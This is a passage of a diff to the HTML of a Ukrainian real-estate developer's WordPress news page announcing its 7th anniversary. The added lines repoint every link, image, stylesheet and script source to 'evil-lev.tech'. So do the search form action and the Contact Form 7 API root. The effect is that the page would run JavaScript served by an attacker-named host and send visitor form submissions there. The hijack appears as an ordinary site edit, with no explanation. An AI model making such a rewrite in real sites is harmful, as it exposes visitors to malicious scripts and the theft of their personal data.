-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_003-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_003-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">ServiceHouse</span>
                                     </a>
                                 </li>
                                                         <li>
-                                    <a href="https://lev-development.com.ua/levinvest/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/levinvest/" class="t-move-wrap ">
                                         <span class="img-enter">
-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_004-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_004-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">LEV INVEST</span>
                                     </a>
                                 </li>
                                                         <li>
-                                    <a href="https://lev-development.com.ua/lev-realty/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/lev-realty/" class="t-move-wrap ">
                                         <span class="img-enter">
-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_005-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_005-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">LEV Realty</span>
                                     </a>
                                 </li>
                                                         <li>
-                                    <a href="https://lev-development.com.ua/lev-liveride/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/lev-liveride/" class="t-move-wrap ">
                                         <span class="img-enter">
-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_006-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_006-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">LEV Live&Ride</span>
                                     </a>
@@ -224,7 +224,7 @@
                             <li><a href="#" class="flatrisbutton" data-flatris-id="1dzoQ0NdPNW83pR">ЖК HYGGE lux</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="P3XQb0gM1wWzAg1">ЖК SILENT PARK</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="4Qd7VxYrVeWJpRA">ЖК PERFECT LIFE</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="e18Xg6keKxydMQj">ЖК FEEL HOUSE</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="Na9e4xlDjxVBYnA">ЖК ARTHOUSE park</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="9gEpvWn8y0bP514">ЖК HYGGE</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="krGQj6PPy6AD9My">ЖК OBRIY 3</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="e18Xg6kAKAxydMQ">ЖК Central Hills</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="vo24Mx379x93yga">ЖК LIFE STORY</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="mbdRBxrXBD67Z8a">Smart Hill</a></li><li><a href="#" class="flatrisbutton" data-flatris-id="yNLpPx5NdzWX3Zb">LEV CITY HOTEL</a></li>                        </ul>
                     </div>
 
-                    <div class="lang" tabindex="0"><span>УКР</span><ul><li><a href='https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/'>ENG</a></li></ul></div>                    
+                    <div class="lang" tabindex="0"><span>УКР</span><ul><li><a href='https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/'>ENG</a></li></ul></div>                    
                 </div>
             </div>
 
@@ -244,7 +244,7 @@
     <main>
         <section class="top-banner-full anime bg-main js-fade-height js-t-height">
             <div class="img-enter full-size rellax" data-rellax-speed="-2">
-                <div class="bg-full" data-bg="https://lev-development.com.ua/wp-content/uploads/2021/09/sl-111019-24830-40-peretvorenyj.jpg"></div>
+                <div class="bg-full" data-bg="https://evil-lev.tech/wp-content/uploads/2021/09/sl-111019-24830-40-peretvorenyj.jpg"></div>
             </div>
             <div class="container custom relative fade-scroll">
                 <div class="row">
@@ -269,15 +269,15 @@
                 <div class="row">
                     <div class="col-lg-2 order-2 order-lg-1">
                         <div class="blog-detail-controls">
-                            <a href="https://lev-development.com.ua/novyny/" class="back-btn swiper-button-prev type2">
+                            <a href="https://evil-lev.tech/novyny/" class="back-btn swiper-button-prev type2">
                                 <span class="ar"></span>
                             </a>
                             <div class="shares">
                                 <div class="socials">
-                                    <a class="tw" href="https://telegram.me/share/url?text=LEV Development святкує 7-ми річчя 🎉&url=https://lev-development.com.ua/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/" target="_blank">
+                                    <a class="tw" href="https://telegram.me/share/url?text=LEV Development святкує 7-ми річчя 🎉&url=https://evil-lev.tech/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/" target="_blank">
                                         <svg class="fill-hover" height="682pt" viewBox="-21 -51 682.66669 682" width="682pt" xmlns="http://www.w3.org/2000/svg" fill="rgba(255,255,255,.8)"><path d="m640-1.667969-640 272.039063 167.777344 66.585937 59.726562 224.507813 109.976563-106.558594 178.917969 123.570312zm-403.78125 367.402344-6.457031 58.535156-24.800781-93.234375 435.039062-332.703125zm0 0"/></svg>
                                     </a>
-                                    <a class="fb" href="https://www.facebook.com/sharer/sharer.php?u=https://lev-development.com.ua/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/" target="_blank">
+                                    <a class="fb" href="https://www.facebook.com/sharer/sharer.php?u=https://evil-lev.tech/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/" target="_blank">
                                         <svg class="fill-hover" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="430.113px" height="430.114px" viewBox="0 0 430.113 430.114" style="enable-background:new 0 0 430.113 430.114;" xml:space="preserve" fill="rgba(255,255,255,.8)">
                                         <g>
                                             <path d="M158.081,83.3c0,10.839,0,59.218,0,59.218h-43.385v72.412h43.385v215.183h89.122V214.936h59.805
@@ -301,7 +301,7 @@
 <p>Любов до своєї справи, бажання створювати найкраще, відчувати клієнтів та задовольняти їх потреби — вже <strong>7 років</strong> основні принципи <strong>LEV Development</strong>. За цей час компанія зробила чималий внесок у зміцнення та розвиток нашої держави.</p>
 <p>У кожен проєкт команда LEV вкладає душу та досвід, тому завжди впевнені в результаті. Будуємо якісне майбутнє українців, змінюємо стиль життя, підкорюємо нові вершини.</p>
 <p>Далі — більше 🥰</p>
-    <img data-src="https://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya-1000x525.jpg.pagespeed.ce.oMuW-mU7JK.jpg" alt="">
+    <img data-src="https://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya-1000x525.jpg.pagespeed.ce.oMuW-mU7JK.jpg" alt="">
                             </article>
                         </div>
                     </div>
@@ -311,8 +311,8 @@
                     <div class="col-lg-10 offset-lg-2 fade-anime">
                         <div class="blog-detail-layout">
                             <div class="prev-next">
-                                                                    <a class="btn btn-lg prev" href="https://lev-development.com.ua/hid-budivnycztva-zhk-central-hills-veresen-2022/"><span>попередня новина<span class="ar"></span></span></a>
-                                                                                                    <a class="btn btn-lg next" href="https://lev-development.com.ua/hid-budivnycztva-zhk-perfect-life-veresen-2022/"><span>наступна новина<span class="ar"></span></span></a>
+                                                                    <a class="btn btn-lg prev" href="https://evil-lev.tech/hid-budivnycztva-zhk-central-hills-veresen-2022/"><span>попередня новина<span class="ar"></span></span></a>
+                                                                                                    <a class="btn btn-lg next" href="https://evil-lev.tech/hid-budivnycztva-zhk-perfect-life-veresen-2022/"><span>наступна новина<span class="ar"></span></span></a>
                                                             </div>
                         </div>
                     </div>
@@ -331,7 +331,7 @@
 
     <footer class="anime bg-white">
         <div class="footer-bg img-enter">
-            <div class="bg-full" data-bg="https://lev-development.com.ua/wp-content/themes/lev/img/footer-bg.jpg"></div>
+            <div class="bg-full" data-bg="https://evil-lev.tech/wp-content/themes/lev/img/footer-bg.jpg"></div>
         </div>
         <div class="footer-container">
             <div class="top">
@@ -340,11 +340,11 @@
                         <div class="row h-100">
                             <div class="col-md-2 text-center d-xs-none custom-footer-block">
                                 <a href="index.php" class="logo-footer logo-link">
-                                    <img class="img" data-src="https://lev-development.com.ua/wp-content/themes/lev/img/lev-logo-white.svg" alt="">
+                                    <img class="img" data-src="https://evil-lev.tech/wp-content/themes/lev/img/lev-logo-white.svg" alt="">
                                 </a>
                                 <!-- <br> -->
                                 <a class="d-inline-block logo-link" href="https://azuz.org.ua/lviv-interactive-map/?action=get_map_data&fn_region=0&fn_builder=2394" target="_blank">
-                                    <img class="img" data-src="https://lev-development.com.ua/wp-content/themes/lev/img/azuz_big.png.pagespeed.ce.UYG4coAHT7.png" alt="">
+                                    <img class="img" data-src="https://evil-lev.tech/wp-content/themes/lev/img/azuz_big.png.pagespeed.ce.UYG4coAHT7.png" alt="">
                                 </a>
                             </div>
                             <div class="col-md-10 f-content ptf d-flex flex-column">
@@ -353,23 +353,23 @@
                                     <div class="col-md-8">
                                                                                     <div class="f-title">Відділи продажу</div>
                                                                                                 <a class="icon-link smaller" href="https://goo.gl/maps/o3SfyhStd6e72CaV6" target="_blank">
-                                                        <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                        <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                         <span>м. Львів, вул. Малоголосківська, 30</span>
                                                     </a>
                                                                                                     <a class="icon-link smaller" href="https://goo.gl/maps/5gvZMxcXC1qRENwN7" target="_blank">
-                                                        <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                        <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                         <span>м. Київ, вул. Метрологічна, 13а</span>
                                                     </a>
                                                                                                     <a class="icon-link smaller" href="https://goo.gl/maps/nWsiUnsCsRS2GbyS8" target="_blank">
-                                                        <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                        <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                         <span>м. Львів, вул. Орлика</span>
                                                     </a>
                                                                                                     <a class="icon-link smaller" href="https://goo.gl/maps/L6rMD6MdunPPEysv9" target="_blank">
-                                                        <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                        <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                         <span>м. Київ, Лисогірський провулок, 20</span>
                                                     </a>
                                                                                                     <a class="icon-link smaller" href="https://goo.gl/maps/2gy6r4NyUGZVu5Av5" target="_blank">
-                                                        <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                        <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                         <span>м. Винники, вул. Галицька</span>
                                                     </a>
                                                                                     </div>
@@ -378,7 +378,7 @@
                                                                                 <div class="col-md-4">
                                                                                             <div class="f-title">Офіс</div>
                                                 <a class="icon-link office-link smaller" href="https://www.google.com.ua/maps/place/Velyka+Vasylkivska+St,+72,+Kyiv,+03150/@50.4322203,30.5128908,17z/data=!3m1!4b1!4m5!3m4!1s0x40d4cee2afc20e29:0xf1cf09399bbc3b7a!8m2!3d50.4322169!4d30.5150795?hl=ua&amp;roistat_visit=287622" target="_blank">
-                                                    <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/points-colored.svg" alt="">
+                                                    <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/points-colored.svg" alt="">
                                                     <span>м. Київ, вул. Велика Васильківська, 72</span>
                                                 </a>
                                             
@@ -459,7 +459,7 @@
                                 </div>
                                 <nav>
                                     <ul>
-                                        <li><a class="" href="https://lev-development.com.ua/pro-nas/">Про нас</a></li><li><a class="" href="https://lev-development.com.ua/lev-club/">LEV Club</a></li><li><a class="" href="https://lev-development.com.ua/servicehouse/">SERVICEHOUSE</a></li><li><a class="" href="https://lev-development.com.ua/levinvest/">LEV Invest</a></li><li><a class="" href="https://lev-development.com.ua/lev-realty/">LEV Realty</a></li><li><a class="" href="https://lev-development.com.ua/lev-liveride/">LEV Live&Ride</a></li>                                    </ul>
+                                        <li><a class="" href="https://evil-lev.tech/pro-nas/">Про нас</a></li><li><a class="" href="https://evil-lev.tech/lev-club/">LEV Club</a></li><li><a class="" href="https://evil-lev.tech/servicehouse/">SERVICEHOUSE</a></li><li><a class="" href="https://evil-lev.tech/levinvest/">LEV Invest</a></li><li><a class="" href="https://evil-lev.tech/lev-realty/">LEV Realty</a></li><li><a class="" href="https://evil-lev.tech/lev-liveride/">LEV Live&Ride</a></li>                                    </ul>
                                 </nav>
                             </div>
                         </div>
@@ -468,7 +468,7 @@
             </div>
             <div class="copyright">
                 <div>© LEV Development 2023</div>
-                <a href="https://redstone.media" class="dev" title="Створення сайтів REDSTONE">Створення сайтів <img data-src="https://lev-development.com.ua/wp-content/themes/lev/img/redstone.svg" alt="Створення сайтів REDSTONE"></a>
+                <a href="https://redstone.media" class="dev" title="Створення сайтів REDSTONE">Створення сайтів <img data-src="https://evil-lev.tech/wp-content/themes/lev/img/redstone.svg" alt="Створення сайтів REDSTONE"></a>
             </div>
         </div>
     </footer>
@@ -479,7 +479,7 @@
     <div class="search-popup bg-white">
         <div class="btn-close"></div>
         <div class="content">
-            <form action="https://lev-development.com.ua/?page_id=459" method="get">
+            <form action="https://evil-lev.tech/?page_id=459" method="get">
             <div class="h5 title">Житловий комплекс</div>
             <select class="SelectBox" name="compl">
                 <option value="">Всі ЖК</option>
@@ -700,33 +700,33 @@ var h=d.getElementsByTagName('script')[0];h.parentNode.insertBefore(s,h);
             <span class="button-text">запис на консультацію</span>
         <span class="icon"></span>
 </a>
-<link rel='stylesheet' id='bootstrap-css-css' href='https://lev-development.com.ua/wp-content/themes/lev/css/bootstrap.bottom.css,qver=9.075.pagespeed.ce.khZZg8_JzE.css' type='text/css' media='all'/>
-<link rel='stylesheet' id='jquery-ui-css-css' href='https://lev-development.com.ua/wp-content/themes/lev/css/jquery-ui.min.css,qver=9.075.pagespeed.ce.FOIeqTyTGI.css' type='text/css' media='all'/>
-<link rel='stylesheet' id='bottom-css-css' href='https://lev-development.com.ua/wp-content/themes/lev/css/style.css,qver=9.075.pagespeed.ce.Ulmt6FodBA.css' type='text/css' media='all'/>
-<link rel='stylesheet' id='theme-css-css' href='https://lev-development.com.ua/wp-content/themes/lev/style.css,qver=9.075.pagespeed.ce.vRoKGaDkwa.css' type='text/css' media='all'/>
-<link rel='stylesheet' id='wp-block-library-css' href='https://lev-development.com.ua/wp-includes/css/dist/block-library/style.min.css,qver=6.1.1.pagespeed.ce.cdklhkFT8O.css' type='text/css' media='all'/>
-<link rel='stylesheet' id='classic-theme-styles-css' href='https://lev-development.com.ua/wp-includes/css/classic-themes.min.css,qver=1.pagespeed.ce.leiR8o5Eqb.css' type='text/css' media='all'/>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/plugins/contact-form-7/includes/swv/js/index.js,qver=5.7.2.pagespeed.ce.fwc04ijT8a.js' id='swv-js'></script>
+<link rel='stylesheet' id='bootstrap-css-css' href='https://evil-lev.tech/wp-content/themes/lev/css/bootstrap.bottom.css,qver=9.075.pagespeed.ce.khZZg8_JzE.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='jquery-ui-css-css' href='https://evil-lev.tech/wp-content/themes/lev/css/jquery-ui.min.css,qver=9.075.pagespeed.ce.FOIeqTyTGI.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='bottom-css-css' href='https://evil-lev.tech/wp-content/themes/lev/css/style.css,qver=9.075.pagespeed.ce.Ulmt6FodBA.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='theme-css-css' href='https://evil-lev.tech/wp-content/themes/lev/style.css,qver=9.075.pagespeed.ce.vRoKGaDkwa.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='wp-block-library-css' href='https://evil-lev.tech/wp-includes/css/dist/block-library/style.min.css,qver=6.1.1.pagespeed.ce.cdklhkFT8O.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='classic-theme-styles-css' href='https://evil-lev.tech/wp-includes/css/classic-themes.min.css,qver=1.pagespeed.ce.leiR8o5Eqb.css' type='text/css' media='all'/>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/plugins/contact-form-7/includes/swv/js/index.js,qver=5.7.2.pagespeed.ce.fwc04ijT8a.js' id='swv-js'></script>
 <script type='text/javascript' id='contact-form-7-js-extra'>
 /* <![CDATA[ */
-var wpcf7 = {"api":{"root":"https:\/\/lev-development.com.ua\/wp-json\/","namespace":"contact-form-7\/v1"}};
+var wpcf7 = {"api":{"root":"https:\/\/evil-lev.tech\/wp-json\/","namespace":"contact-form-7\/v1"}};
 /* ]]> */
 </script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/plugins/contact-form-7/includes/js/index.js,qver=5.7.2.pagespeed.ce.9XQ1qSfUIg.js' id='contact-form-7-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-includes/js/jquery/jquery.min.js,qver=3.6.1.pagespeed.ce.F3ODGNYdOU.js' id='jquery-core-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-includes/js/jquery/jquery-migrate.min.js,qver=3.3.2.pagespeed.ce.ebSVa37EeO.js' id='jquery-migrate-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/jquery-ui.min.js,qver=9.075.pagespeed.ce.YQGF8j0SVn.js' id='jquery-ui-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/swiper.min.js,qver=9.075.pagespeed.ce.isR4iIzkY3.js' id='swiper-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/jquery.sumoselect.min.js,qver=9.075.pagespeed.ce.H01wp9hV8e.js' id='sumoselect-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/SmoothScroll.js,qver=9.075.pagespeed.ce.LVxUa3aRy5.js' id='SmoothScroll-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/global.js,qver=9.075.pagespeed.ce.2JWom0ASaK.js' id='global-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/card-parralax.js,qver=9.075.pagespeed.ce.IT2yMdoQ2Q.js' id='card-parralax-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/TweenMax.min.js,qver=9.075.pagespeed.ce.Cn8kfXNATK.js' id='TweenMax-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/jquery.lettering.js,qver=9.075.pagespeed.ce.BzioWQ4s9d.js' id='lettering-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/custom-anime.js,qver=9.075.pagespeed.ce.dc2IozKHnP.js' id='custom-anime-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/jquery.inputmask.min.js,qver=9.075.pagespeed.ce.ouyNH2ED9G.js' id='jquery-inputmask-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/main.js,qver=9.075.pagespeed.ce.2qS-Jtg9Uf.js' id='main-js-js'></script>
-<script type='text/javascript' src='https://lev-development.com.ua/wp-content/themes/lev/js/rellax.min.js,qver=9.075.pagespeed.ce.Altah9lSpY.js' id='rellax-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/plugins/contact-form-7/includes/js/index.js,qver=5.7.2.pagespeed.ce.9XQ1qSfUIg.js' id='contact-form-7-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-includes/js/jquery/jquery.min.js,qver=3.6.1.pagespeed.ce.F3ODGNYdOU.js' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-includes/js/jquery/jquery-migrate.min.js,qver=3.3.2.pagespeed.ce.ebSVa37EeO.js' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/jquery-ui.min.js,qver=9.075.pagespeed.ce.YQGF8j0SVn.js' id='jquery-ui-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/swiper.min.js,qver=9.075.pagespeed.ce.isR4iIzkY3.js' id='swiper-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/jquery.sumoselect.min.js,qver=9.075.pagespeed.ce.H01wp9hV8e.js' id='sumoselect-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/SmoothScroll.js,qver=9.075.pagespeed.ce.LVxUa3aRy5.js' id='SmoothScroll-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/global.js,qver=9.075.pagespeed.ce.2JWom0ASaK.js' id='global-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/card-parralax.js,qver=9.075.pagespeed.ce.IT2yMdoQ2Q.js' id='card-parralax-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/TweenMax.min.js,qver=9.075.pagespeed.ce.Cn8kfXNATK.js' id='TweenMax-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/jquery.lettering.js,qver=9.075.pagespeed.ce.BzioWQ4s9d.js' id='lettering-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/custom-anime.js,qver=9.075.pagespeed.ce.dc2IozKHnP.js' id='custom-anime-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/jquery.inputmask.min.js,qver=9.075.pagespeed.ce.ouyNH2ED9G.js' id='jquery-inputmask-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/main.js,qver=9.075.pagespeed.ce.2qS-Jtg9Uf.js' id='main-js-js'></script>
+<script type='text/javascript' src='https://evil-lev.tech/wp-content/themes/lev/js/rellax.min.js,qver=9.075.pagespeed.ce.Altah9lSpY.js' id='rellax-js-js'></script>
 <script type="text/javascript">
     (function (d, s, u, e, p) {
         p = d.getElementsByTagName(s)[0], e = d.createElement(s), e.async = 1, e.src = u, p.parentNode.insertBefore(e, p);
